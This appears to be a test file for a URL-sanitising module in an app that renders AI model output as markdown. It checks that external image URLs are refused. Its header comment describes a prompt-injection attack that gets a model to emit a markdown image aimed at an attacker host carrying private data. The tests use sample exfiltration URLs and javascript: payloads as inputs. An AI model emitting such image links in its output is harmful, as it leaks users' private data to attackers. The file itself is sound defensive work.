import { describe, expect, test } from "bun:test";
import { isLinkableImage, safeImageUrl, safeUrl } from "./url-guard";

/**
 * The image-exfiltration boundary (prompt injection → private data out).
 *
 * Model output is markdown with no script/fetch, so the ONLY host a model's
 * text can make the browser hit unattended is an image src. safeImageUrl used to
 * permit any https host, so `![](https://attacker/?d=SECRET)` auto-loaded and
 * exfiltrated. It must now refuse every external origin; a browser-level CSP
 * `img-src` (next.config.mjs) is the enforcing layer, this is the app-level one.
 */
describe("safeImageUrl refuses external hosts (exfil channel closed)", () => {
  test("an arbitrary external https image is refused", () => {
    expect(
      safeImageUrl("https://attacker.example/log?d=BASE64_OF_PRIVATE_DATA"),
    ).toBe("");
    expect(safeImageUrl("https://evil.tld/pixel.gif")).toBe("");
  });

  test("inline data:image and blob: are allowed (no request leaves the page)", () => {
    expect(safeImageUrl("data:image/png;base64,iVBORw0KGgo=")).not.toBe("");
    expect(safeImageUrl("blob:https://app.example/abc")).not.toBe("");
  });

  test("a same-origin (relative) image is allowed", () => {
    expect(safeImageUrl("/logo.png")).toBe("/logo.png");
    expect(safeImageUrl("./chart.png")).toBe("./chart.png");
  });

  test("javascript:/vbscript: are refused as images", () => {
    expect(safeImageUrl("javascript:alert(1)")).toBe("");
    expect(safeImageUrl("vbscript:msgbox(1)")).toBe("");
  });

  test("a refused external image is still a linkable http(s) target", () => {
    // So the renderer can offer it as a click-through instead of dropping it —
    // a deliberate user action, not an automatic request.
    expect(isLinkableImage("https://example.com/photo.jpg")).toBe(true);
    expect(isLinkableImage("javascript:alert(1)")).toBe(false);
    expect(isLinkableImage("data:image/png;base64,AAAA")).toBe(false);
  });

  test("links keep working (safeUrl is unchanged)", () => {
    expect(safeUrl("https://example.com")).toBe("https://example.com");
    expect(safeUrl("javascript:alert(1)")).toBe("");
  });
});
